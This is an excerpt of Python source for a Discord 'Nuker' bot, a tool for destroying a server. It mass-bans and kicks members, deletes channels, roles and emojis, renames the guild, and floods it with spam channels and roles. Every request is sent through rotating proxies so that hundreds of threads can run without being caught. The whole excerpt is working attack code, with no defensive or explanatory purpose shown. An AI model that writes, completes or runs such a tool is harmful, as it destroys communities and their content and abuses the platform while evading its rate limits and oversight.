...
class Nuker(commands.Bot):
    ...
    def __init__(self):
        ...
        self.proxies: cycle = cycle([line.strip() for line in open("data/proxies.txt")])
    ...
    async def CheckRequired(self) -> None:
        try:
            g = await self.fetch_guild(self.guild)
            Pp(t=f"Fetched guild {g.name}")
    ...
    def SlaughterBan(self, member: str | int, http: str) -> None:
        try:
            r = requests.put(url="https://discord.com/api/v9/users/@me", headers=self.headers, proxies={'http': 'http://' + http, 'https': 'https://' + http})
    ...
    def SlaughterMembers(self, member: str | int, http: str) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/members/{member}", headers=self.headers, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
    ...
    def SlaughterChannels(self, channel: str | int, http: str) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/channels/{channel}", headers=self.headers, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
    ...
    def SlaughterRoles(self, role: str | int, http: str) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/roles/{role}", headers=self.headers, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
    ...
    def SlaughterEmojis(self, emoji: str | int, http: str) -> None:
        try:
            r = requests.delete(url=f"https://discord.com/api/v9/guilds/{self.guild}/emojis/{emoji}", headers=self.headers, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
    ...
    def ConstructChannels(self, http: str) -> None:
        try:
            name = choice(self.channel_names)
            payload = {'type': 0, 'permission_overwrites': [], 'name': name}
            r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild}/channels", headers=self.headers, json=payload, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            print(r.status_code)
            if (r.status_code in (200, 201, 204)):
    ...
    def ConstructRoles(self, http: str) -> None:
        try:
            color = next(self.decimal_colors)
            name = choice(self.role_names)
            payload = {'name': name, 'color': color}
            rgb = self.utilities.DecimalToRGB(decimal=color)
            r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild}/roles", headers=self.headers, json=payload, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
    ...
    def EditName(self, http: str) -> None:
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild}", headers=self.headers, json = {'name': self.guild_name}, proxies={'http': 'http://' + http, 'https': 'https://' + http})
            if (r.status_code in (200, 201, 204)):
                ...
                if (intake == 'n'):
                    ...
                    if (suggestion == "banall"):
                        for m in self.members:
                            up_next = next(self.proxies)
                            Thread(target=self.SlaughterBan, args=(m,up_next,)).start()
                    ...
                    if (suggestion == "kickall"):
                        for m in self.members:
                            up_next = next(self.proxies)
                            Thread(target=self.SlaughterMembers, args=(m,up_next,)).start()
                    ...
                    if (suggestion == "deleteemojis"):
                        for e in self.emojiis:
                            up_next = next(self.proxies)
                            Thread(target=self.SlaughterEmojis, args=(e,up_next,)).start()
                    ...
                    if (suggestion == "deletechannels"):
                        for c in self.channels:
                            up_next = next(self.proxies)
                            Thread(target=self.SlaughterChannels, args=(c,up_next,)).start()
                    ...
                    if (suggestion == "spamchannels"):
                        ...
                        for i in range(amount):
                            up_next = next(self.proxies)
                            Thread(target=self.ConstructChannels, args=(up_next,)).start()
                    ...
                    if (suggestion == "spamroles"):
                        ...
                        for i in range(amount):
                            up_next = next(self.proxies)
                            Thread(target=self.ConstructRoles, args=(up_next,)).start()
